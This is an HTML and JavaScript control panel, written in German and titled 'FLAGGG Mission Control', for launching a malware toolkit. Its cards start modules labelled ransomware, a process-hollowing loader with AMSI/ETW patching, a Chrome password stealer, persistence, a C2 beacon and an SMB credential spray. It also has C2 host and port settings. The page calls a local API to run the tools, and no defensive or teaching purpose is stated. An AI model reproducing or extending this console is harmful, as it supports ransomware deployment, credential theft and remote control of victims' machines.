<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<title>FLAGGG — Mission Control</title>
<style>
  :root {
    --bg: #0a0e14; --panel: #111722; --panel2: #0d121b;
    --line: #1e2a3a; --txt: #c8d4e3; --dim: #5b6b80;
    --accent: #22d3ee; --ok: #34d399; --warn: #fbbf24; --bad: #f87171;
    --mono: "Cascadia Mono", Consolas, monospace;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: radial-gradient(1200px 600px at 70% -10%, #101d2e 0%, var(--bg) 55%);
    color: var(--txt); font-family: var(--mono); min-height: 100vh;
  }
  .wrap { max-width: 1200px; margin: 0 auto; padding: 24px 20px 60px; }

  /* header */
  header { display: flex; align-items: center; gap: 16px; padding-bottom: 18px;
           border-bottom: 1px solid var(--line); margin-bottom: 22px; }
  .logo { width: 42px; height: 42px; flex: 0 0 42px; }
  .logo svg { width: 100%; height: 100%; }
  h1 { font-size: 20px; letter-spacing: 3px; color: #e6f0fa; }
  h1 span { color: var(--accent); }
  .sub { color: var(--dim); font-size: 11px; letter-spacing: 1px; margin-top: 2px; }
  .spacer { flex: 1; }
  .statusdot { width: 10px; height: 10px; border-radius: 50%;
               background: var(--dim); box-shadow: 0 0 0 0 rgba(52,211,153,0); }
  .statusdot.live { background: var(--ok); box-shadow: 0 0 10px rgba(52,211,153,.7); }
  .statusdot.down { background: var(--bad); }

  /* stats row */
  .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
           gap: 12px; margin-bottom: 22px; }
  .stat { background: var(--panel); border: 1px solid var(--line); border-radius: 10px;
          padding: 12px 14px; }
  .stat .k { font-size: 10px; color: var(--dim); letter-spacing: 1px; }
  .stat .v { font-size: 18px; color: #eaf2fb; margin-top: 4px; }
  .stat .v small { color: var(--dim); font-size: 11px; }

  /* module grid */
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
          gap: 14px; }
  .card { background: linear-gradient(180deg, var(--panel), var(--panel2));
          border: 1px solid var(--line); border-radius: 12px; padding: 16px;
          transition: border-color .2s, transform .2s; position: relative; overflow: hidden; }
  .card:hover { border-color: #2c3d52; transform: translateY(-2px); }
  .card .icon { width: 34px; height: 34px; margin-bottom: 10px; }
  .card .icon svg { width: 100%; height: 100%; }
  .card h3 { font-size: 14px; letter-spacing: 1px; color: #dbe7f5; margin-bottom: 4px; }
  .card p { font-size: 11px; color: var(--dim); line-height: 1.5; margin-bottom: 12px; min-height: 32px; }
  .badge { position: absolute; top: 12px; right: 12px; font-size: 9px;
           letter-spacing: 1px; padding: 3px 8px; border-radius: 20px;
           border: 1px solid var(--line); color: var(--dim); }
  .badge.ready { color: var(--ok); border-color: rgba(52,211,153,.35); }
  .badge.warn { color: var(--warn); border-color: rgba(251,191,36,.35); }
  .row { display: flex; gap: 8px; align-items: center; }
  .cl { border: 1px solid var(--line); background: #0c111a; color: var(--accent);
        font-family: var(--mono); font-size: 11px; padding: 7px 12px; border-radius: 8px;
        cursor: pointer; transition: all .15s; flex: 1; }
  .cl:hover { background: #122031; border-color: var(--accent); }
  .cl.primary { background: rgba(34,211,238,.08); border-color: rgba(34,211,238,.4); }
  .cl.primary:hover { background: rgba(34,211,238,.16); }
  .cl:active { transform: scale(.97); }

  /* config panel */
  .cfg { margin-top: 22px; background: var(--panel); border: 1px solid var(--line);
         border-radius: 12px; padding: 16px; }
  .cfg h2 { font-size: 12px; letter-spacing: 2px; color: var(--dim); margin-bottom: 12px; }
  .cfgrow { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 10px; }
  .cfg label { display: block; font-size: 10px; color: var(--dim); margin-bottom: 4px; }
  .cfg input { width: 100%; background: #0c111a; border: 1px solid var(--line);
               color: #eaf2fb; font-family: var(--mono); font-size: 12px;
               padding: 8px 10px; border-radius: 8px; outline: none; }
  .cfg input:focus { border-color: var(--accent); }

  /* log */
  .log { margin-top: 22px; background: #070b10; border: 1px solid var(--line);
         border-radius: 12px; padding: 14px 16px; }
  .log h2 { font-size: 12px; letter-spacing: 2px; color: var(--dim); margin-bottom: 10px; }
  #logbox { height: 180px; overflow-y: auto; font-size: 11px; color: #8fa3ba; line-height: 1.7; }
  #logbox div { border-bottom: 1px dashed #131c28; padding: 2px 0; }
  #logbox .t { color: var(--dim); margin-right: 8px; }
  #logbox .ok { color: var(--ok); } #logbox .err { color: var(--bad); }
  #logbox .info { color: var(--accent); }

  footer { margin-top: 24px; text-align: center; color: var(--dim); font-size: 10px; letter-spacing: 2px; }
</style>
</head>
<body>
<div class="wrap">

  <header>
    <div class="logo">
      <svg viewBox="0 0 48 48" fill="none">
        <path d="M24 4 L42 14 V34 L24 44 L6 34 V14 Z" stroke="#22d3ee" stroke-width="2" fill="rgba(34,211,238,.06)"/>
        <circle cx="24" cy="24" r="6" fill="#22d3ee"/>
        <path d="M24 18 V10 M24 38 V30 M10 24 H18 M30 24 H38" stroke="#22d3ee" stroke-width="2"/>
      </svg>
    </div>
    <div>
      <h1>FLAGGG <span>MISSION CONTROL</span></h1>
      <div class="sub">TOOLKIT · OPERATION CONSOLE</div>
    </div>
    <div class="spacer"></div>
    <div id="srvstatus" class="statusdot down" title="Server-Status"></div>
  </header>

  <div class="stats">
    <div class="stat"><div class="k">SERVER</div><div class="v" id="st_host">—</div></div>
    <div class="stat"><div class="k">PROZESSE</div><div class="v" id="st_pids">—</div></div>
    <div class="stat"><div class="k">MODULE</div><div class="v">7 <small>bereit</small></div></div>
    <div class="stat"><div class="k">SESSION</div><div class="v" id="st_sess">—</div></div>
  </div>

  <div class="grid" id="grid"></div>

  <div class="cfg">
    <h2>KONFIGURATION</h2>
    <div class="cfgrow">
      <div><label>C2 HOST</label><input id="cfg_host" value="10.10.13.37"></div>
      <div><label>C2 PORT</label><input id="cfg_port" value="8443"></div>
      <div><label>OFFSET BASE</label><input id="cfg_base" value="0x0F2C10"></div>
      <div><label>OFFSET HP</label><input id="cfg_hp" value="0x0A4"></div>
      <div><label>GAME MODUL</label><input id="cfg_mod" value="game.dll"></div>
    </div>
  </div>

  <div class="log">
    <h2>LIVE-LOG</h2>
    <div id="logbox"></div>
  </div>

  <footer>FLAGGG · LOKAL · KEINE HAND ZWISCHEN UNS</footer>
</div>

<script>
// ---- modulo-definitionen ----
const MODULES = [
  { id:'ransom',  icon:'M', name:'RANSOMWARE',   desc:'AES-256-GCM, in-place, Skip-Liste, Note, Self-Delete', cli:'ransom.exe' },
  { id:'loader',  icon:'L', name:'LOADER',       desc:'Process Hollowing + AMSI/ETW-Patch',                     cli:'hollow.exe' },
  { id:'stealer', icon:'S', name:'STEALER',      desc:'Chrome Login Data · DPAPI + AES-GCM v10',                 cli:'steal.exe' },
  { id:'persist', icon:'P', name:'PERSISTENZ',   desc:'schtasks / Run-Key / WMI-Subscription',                   cli:'persist.exe' },
  { id:'beacon',  icon:'C', name:'C2-BEACON',   desc:'Polling, XOR+B64, Task-Execution, Jitter',                cli:'beacon.exe' },
  { id:'spray',   icon:'X', name:'SPRAY',        desc:'445-Scan + SMB-Cred-Spray',                               cli:'spray.exe' },
  { id:'trainer', icon:'T', name:'TRAINER',      desc:'RPM-Pointerchain, God-Mode, Ammo',                        cli:'trainer_gui.exe' },
];

// ---- log ----
const logbox = document.getElementById('logbox');
function log(msg, cls='info') {
  const d = document.createElement('div');
  const t = new Date().toLocaleTimeString('de-DE');
  d.innerHTML = `<span class="t">[${t}]</span><span class="${cls}">${msg}</span>`;
  logbox.prepend(d);
  while (logbox.children.length > 200) logbox.lastChild.remove();
}

// ---- grid bauen ----
const grid = document.getElementById('grid');
MODULES.forEach(m => {
  const card = document.createElement('div');
  card.className = 'card';
  card.innerHTML = `
    <div class="badge ready">BEREIT</div>
    <div class="icon"><svg viewBox="0 0 34 34" fill="none">
      <rect x="3" y="3" width="28" height="28" rx="7" stroke="#22d3ee" stroke-width="1.5" fill="rgba(34,211,238,.04)"/>
      <text x="17" y="23" text-anchor="middle" font-size="15" font-weight="700" fill="#22d3ee" font-family="monospace">${m.icon}</text>
    </svg></div>
    <h3>${m.name}</h3>
    <p>${m.desc}</p>
    <div class="row">
      <button class="cl primary" data-run="${m.id}">▶ STARTEN</button>
      <button class="cl" data-log="${m.id}">LOG</button>
    </div>`;
  grid.appendChild(card);
});

// ---- server-api ----
async function api(path, opts={}) {
  try {
    const r = await fetch(path, opts);
    if (!r.ok) throw new Error('HTTP ' + r.status);
    return await r.json();
  } catch (e) {
    document.getElementById('srvstatus').className = 'statusdot down';
    return { ok:false, error:String(e) };
  }
}

function setLive(on) {
  document.getElementById('srvstatus').className = 'statusdot ' + (on ? 'live' : 'down');
}

document.addEventListener('click', async e => {
  const run = e.target.dataset.run;
  const l = e.target.dataset.log;
  if (run) {
    log(`STARTE ${MODULES.find(m=>m.id===run).name} …`, 'info');
    const r = await api('/api/run', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ tool:run })
    });
    if (r.ok) log(r.msg, 'ok');
    else log('FEHLER: ' + r.error, 'err');
  }
  if (l) {
    const r = await api('/api/log?tool=' + l);
    if (r.ok) log(`${l}: ${r.log || 'kein output'}`, 'ok');
    else log('FEHLER: ' + r.error, 'err');
  }
});

// ---- status & konfig ----
async function init() {
  const s = await api('/api/status');
  if (s.ok) {
    setLive(true);
    document.getElementById('st_host').textContent = s.host;
    document.getElementById('st_pids').textContent = s.pid;
    document.getElementById('st_sess').textContent = s.session;
    log('Server verbunden', 'ok');
  } else {
    setLive(false);
    log('Server nicht erreichbar — nur Simulation, Start-Buttons laufen ins Leere', 'err');
  }

  // konfig aus localStorage laden
  ['cfg_host','cfg_port','cfg_base','cfg_hp','cfg_mod'].forEach(id => {
    const v = localStorage.getItem('flaggg_' + id);
    if (v) document.getElementById(id).value = v;
  });
}
document.querySelectorAll('.cfg input').forEach(inp => {
  inp.addEventListener('change', () => localStorage.setItem('flaggg_' + inp.id, inp.value));
});

init();
</script>
</body>
</html>
